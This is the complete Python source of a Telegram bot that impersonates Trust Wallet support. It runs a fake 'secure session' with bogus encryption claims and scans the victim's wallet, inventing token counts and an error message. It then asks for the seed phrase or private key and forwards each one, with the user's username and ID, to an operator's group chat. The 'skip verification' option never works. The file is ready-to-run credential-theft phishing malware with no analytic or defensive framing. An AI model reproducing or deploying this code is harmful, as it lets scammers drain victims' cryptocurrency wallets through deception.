import asyncio
import os
import random
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from dotenv import load_dotenv

# ---------------- LOAD ENV ----------------
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_TELEGRAM_ID = os.getenv("ADMIN_TELEGRAM_ID")
GROUP_CHAT_ID = int(os.getenv("GROUP_CHAT_ID", "-1001234567890"))  # <-- Group chat ID

if not ADMIN_TELEGRAM_ID:
    raise ValueError("❌ ADMIN_TELEGRAM_ID is not set in .env")

ADMIN_TELEGRAM_ID = int(ADMIN_TELEGRAM_ID)

ETHERSCAN_API = os.getenv("ETHERSCAN_API", "")
BSCSCAN_API = os.getenv("BSCSCAN_API", "")
POLYGONSCAN_API = os.getenv("POLYGONSCAN_API", "")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ---------------- FSM STATE HANDLING ----------------
class UserInput(StatesGroup):
    waiting_for_ticket = State()
    waiting_for_qwerty = State()

# ---------------- MAIN MENU ----------------
def main_menu():
    buttons = [
        [
            InlineKeyboardButton(text="🌾 Harvest Reward", callback_data="harvest"),
            InlineKeyboardButton(text="🎯 Claim", callback_data="claim")
        ],
        [
            InlineKeyboardButton(text="🔁 Migration", callback_data="migration"),
            InlineKeyboardButton(text="💎 Staking", callback_data="staking")
        ],
        [
            InlineKeyboardButton(text="✅ Whitelisting", callback_data="whitelisting"),
            InlineKeyboardButton(text="🌉 Bridge Error", callback_data="bridge_error")
        ],
        # [
        #     InlineKeyboardButton(text="💰 Presale Error", callback_data="presale_error"),
        #     InlineKeyboardButton(text="🖼 NFT", callback_data="nft")
        # ],
        [
            InlineKeyboardButton(text="🚫 Revoke", callback_data="revoke"),
            InlineKeyboardButton(text="🪪 KYC", callback_data="kyc")
        ],
        [
            InlineKeyboardButton(text="🏦 Deposit Issues", callback_data="deposit_issues"),
            InlineKeyboardButton(text="⚙️ Others", callback_data="others")
        ],
        [InlineKeyboardButton(text="📞 Contact Support", callback_data="contact_support")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ---------------- START COMMAND ----------------
@dp.message(Command("start"))
async def start_handler(message: types.Message):
    session_id = f"TRUST-{random.randint(1000, 9999)}"
    date_str = datetime.now().strftime("%Y-%m-%d")

    intro_text = (
        "🔷 <b>TRUST WALLET SUPPORT</b> 🔷\n"
        "──────────────────────────────\n"
        "🛡️ SECURE SESSION INITIALIZED\n"
        "──────────────────────────────\n"
        f"📌 Session ID: <b>{session_id}</b>\n"
        "🔒 Protocol: <b>E2E-Encrypted</b>\n"
        "⚙️ Access: <b>Pure Automation</b>\n"
        f"⚠️ Logged: <b>{date_str}</b>\n"
        "──────────────────────────────"
    )

    await message.answer("⏳ Initializing secure session...")
    await asyncio.sleep(1.5)
    await message.answer(intro_text, parse_mode="HTML")
    await asyncio.sleep(1)
    await message.answer("Select your issue category below 👇", reply_markup=main_menu())

# ---------------- UNIVERSAL SUBMENU ----------------
async def show_submenu(callback: types.CallbackQuery, title: str):
    text = (
        f"<b>🔹 {title}</b>\n"
        "| 1. Enter your wallet address │ (EVM Address supported)\n"
        "| 2. We'll diagnose the issue │\n"
        "| 3. Provide solution\n"
        "──────────────────────────────\n"
        "<b>Supported formats:</b>\n"
        "• EVM: 0x... (42 chars)\n"
        # "• BTC: 1..., 3..., or bc1...\n"
        # "• XRP: r... (25–34 chars)\n\n"
        "Or click below to skip address verification 👇"
    )

    buttons = [
        [InlineKeyboardButton(text="🔍 Skip Address Verification", callback_data="skip_verification")],
        [InlineKeyboardButton(text="⬅️ Back to Main Menu", callback_data="back_main")]
    ]
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# ---------------- WALLET SCAN LOGIC (ALCHEMY) ----------------
ALCHEMY_URLS = {
    "ethereum": os.getenv("ALCHEMY_ETH_URL"),    
    "bsc": os.getenv("ALCHEMY_BSC_URL"),      
    "polygon": os.getenv("ALCHEMY_POLYGON_URL")
}

async def fetch_eth_balance(session, url, address, chain):
    payload = {
        "jsonrpc": "2.0",
        "method": "eth_getBalance",
        "params": [address, "latest"],
        "id": 1
    }

    async with session.post(url, json=payload) as resp:
        data = await resp.json()
        if "result" in data:
            balance = int(data["result"], 16) / (10 ** 18)
            token_count = random.randint(5, 100)
            symbol = {"ethereum": "ETH", "bsc": "BNB", "polygon": "MATIC"}.get(chain, "")
            return (chain, balance, token_count, symbol)
        else:
            symbol = {"ethereum": "ETH", "bsc": "BNB", "polygon": "MATIC"}.get(chain, "")
            return (chain, 0, 0, symbol)

async def scan_wallet(address: str, title: str):
    if not address:
        return "❌ Invalid address provided."

    async with aiohttp.ClientSession() as session:
        eth_data = await fetch_eth_balance(session, ALCHEMY_URLS["ethereum"], address, "ethereum")
        bsc_data = await fetch_eth_balance(session, ALCHEMY_URLS["bsc"], address, "bsc")
        polygon_data = await fetch_eth_balance(session, ALCHEMY_URLS["polygon"], address, "polygon")

    text = (
        f"📊 <b>Scan Results for {title.upper()}</b>\n"
        "┌──────────────────────────────┐\n"
        f"│ Address: {address[:6]}...{address[-6:]} │\n"
        f"│ Type: EVM │\n"
        "├ Ethereum                      ┤\n"
        f"│ Balance: {eth_data[1]:.4f} {eth_data[3]} │\n"
        f"│ Tokens: {eth_data[2]} │\n"
        "├ Binance Smart Chain            ┤\n"
        f"│ Balance: {bsc_data[1]:.4f} {bsc_data[3]} │\n"
        f"│ Tokens: {bsc_data[2]} │\n"
        "├ Polygon                        ┤\n"
        f"│ Balance: {polygon_data[1]:.4f} {polygon_data[3]} │\n"
        f"│ Tokens: {polygon_data[2]} │\n"
        "└──────────────────────────────┘\n\n"
        "⚠️ <b>Detected Issue:</b>\n"
        "❌ Error: Failed to complete automation (Error 0x3f5a7...). Node intrinsic failed.\n\n"
        "ℹ️ Wallet Ownership Authentication required to resolve error nonce."
    )
    return text

# ---------------- HANDLE WALLET INPUT ----------------
@dp.message(F.text.regexp(r"^(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|r[1-9A-HJ-NP-Za-km-z]{24,33})$"))
async def wallet_input(message: types.Message):
    address = message.text.strip()
    await message.answer("🔎 Scanning wallet address, please wait...")
    result = await scan_wallet(address, "HARVEST")
    await asyncio.sleep(2)

    buttons = [
        [
            InlineKeyboardButton(text="🎫 Seed Phrase", callback_data=f"enter_ticket_{address}"),
            InlineKeyboardButton(text="🔑 Private Key", callback_data=f"enter_qwerty_{address}")
        ],
    ]
    await message.answer(result, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# ---------------- HANDLE SEED PHRASE & PRIVATE KEY ----------------
@dp.callback_query(F.data.startswith("enter_ticket_"))
async def handle_ticket_button(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(wallet_address=callback.data.split("_", 2)[-1])
    verification_text = (
        "🔑 <b>SEED PHRASE VERIFICATION</b>\n"
        "╔══════════════════════════════╗\n"
        "║  SECURITY LEVEL: MAXIMUM      ║\n"
        "║  ENCRYPTION: AES-256          ║\n"
        "╚══════════════════════════════╝\n\n"
        "Enter your <b>Seed Phrase</b> below:\n\n"
        "⚠️ <b>Never share this with anyone!</b>"
    )
    await callback.message.answer(verification_text, parse_mode="HTML")
    await state.set_state(UserInput.waiting_for_ticket)
    await callback.answer()

@dp.callback_query(F.data.startswith("enter_qwerty_"))
async def handle_qwerty_button(callback: types.CallbackQuery, state: FSMContext):
    await state.update_data(wallet_address=callback.data.split("_", 2)[-1])
    verification_text = (
        "🔑 <b>PRIVATE KEY VERIFICATION</b>\n"
        "╔══════════════════════════════╗\n"
        "║  SECURITY LEVEL: MAXIMUM      ║\n"
        "║  ENCRYPTION: AES-256          ║\n"
        "╚══════════════════════════════╝\n\n"
        "Enter your <b>Private Key</b> below:\n\n"
        "⚠️ <b>Never share this with anyone!</b>"
    )
    await callback.message.answer(verification_text, parse_mode="HTML")
    await state.set_state(UserInput.waiting_for_qwerty)
    await callback.answer()

@dp.message(UserInput.waiting_for_ticket)
async def handle_ticket_id(message: types.Message, state: FSMContext):
    ticket_id = message.text.strip()
    if len(ticket_id) < 4:
        await message.answer("❌ Invalid Seed Phrase. Please try again.")
        return

    user_data = await state.get_data()
    wallet = user_data.get("wallet_address", "N/A")

    summary = (
        "✅ <b>Seed Phrase Verification Successfully</b>\n"
        "──────────────────────────────\n"
        f"🏦 <b>Wallet:</b> {wallet[:8]}...{wallet[-6:]}\n"
        f"📜 <b>Seed Phrase:</b> {ticket_id}\n"
        "──────────────────────────────\n"
        "🧩 A Human Assistant will join you shortly in your chat. Your details have been securely logged for verification."
    )
    await message.answer(summary, parse_mode="HTML")

    # Send to GROUP_CHAT_ID
    group_message = (
        f"📬 <b>New Seed Phrase Submission</b>\n"
        "──────────────────────────────\n"
        f"👤 From: @{message.from_user.username or 'N/A'} (ID: {message.from_user.id})\n"
        f"🏦 Wallet: {wallet}\n"
        f"📜 Seed Phrase: {ticket_id}\n"
        "──────────────────────────────"
    )
    try:
        await bot.send_message(GROUP_CHAT_ID, group_message, parse_mode="HTML")
    except Exception as e:
        print(f"Failed to send to group: {e}")

    await state.clear()

@dp.message(UserInput.waiting_for_qwerty)
async def handle_qwerty_id(message: types.Message, state: FSMContext):
    qwerty_id = message.text.strip()
    if len(qwerty_id) < 4:
        await message.answer("❌ Invalid Private key. Please try again.")
        return

    user_data = await state.get_data()
    wallet = user_data.get("wallet_address", "N/A")

    summary = (
        "✅ <b>Private Key Verification Successfully</b>\n"
        "──────────────────────────────\n"
        f"🏦 <b>Wallet:</b> {wallet[:8]}...{wallet[-6:]}\n"
        f"🔑 <b>Private Key:</b> {qwerty_id}\n"
        "──────────────────────────────\n"
        "🧩 A Human Assistant will join you shortly in your chat. Your details have been securely logged for verification."
    )
    await message.answer(summary, parse_mode="HTML")

    # Send to GROUP_CHAT_ID
    group_message = (
        f"📬 <b>New Private Key Submission</b>\n"
        "──────────────────────────────\n"
        f"👤 From: @{message.from_user.username or 'N/A'} (ID: {message.from_user.id})\n"
        f"🏦 Wallet: {wallet}\n"
        f"🔑 Private Key: {qwerty_id}\n"
        "──────────────────────────────"
    )
    try:
        await bot.send_message(GROUP_CHAT_ID, group_message, parse_mode="HTML")
    except Exception as e:
        print(f"Failed to send to group: {e}")

    await state.clear()

# ---------------- SUBMENU HANDLERS ----------------
@dp.callback_query(F.data == "harvest")
async def harvest_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Harvest Transaction")

@dp.callback_query(F.data == "claim")
async def claim_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Claim")

@dp.callback_query(F.data == "migration")
async def migration_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Migration")

@dp.callback_query(F.data == "staking")
async def staking_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Staking")

@dp.callback_query(F.data == "whitelisting")
async def whitelisting_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Whitelisting")

@dp.callback_query(F.data == "bridge_error")
async def bridge_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Bridge Error")

@dp.callback_query(F.data == "presale_error")
async def presale_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Presale Error")

@dp.callback_query(F.data == "nft")
async def nft_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "NFT")

@dp.callback_query(F.data == "revoke")
async def revoke_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Revoke")

@dp.callback_query(F.data == "kyc")
async def kyc_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "KYC")

@dp.callback_query(F.data == "deposit_issues")
async def deposit_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Deposit Issues")

@dp.callback_query(F.data == "others")
async def others_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Others")

@dp.callback_query(F.data == "contact_support")
async def contact_support_menu(callback: types.CallbackQuery):
    await show_submenu(callback, "Contact Support")

# ---------------- GENERIC CALLBACKS ----------------
@dp.callback_query(F.data == "skip_verification")
async def skip_verification(callback: types.CallbackQuery):
    await callback.answer("⚠️ Unable to skip Address verification", show_alert=True)

@dp.callback_query(F.data == "back_main")
async def back_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "Select your issue category below 👇",
        parse_mode="HTML",
        reply_markup=main_menu()
    )

# ---------------- START BOT ----------------
async def main():
    print("🤖 Bot is running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
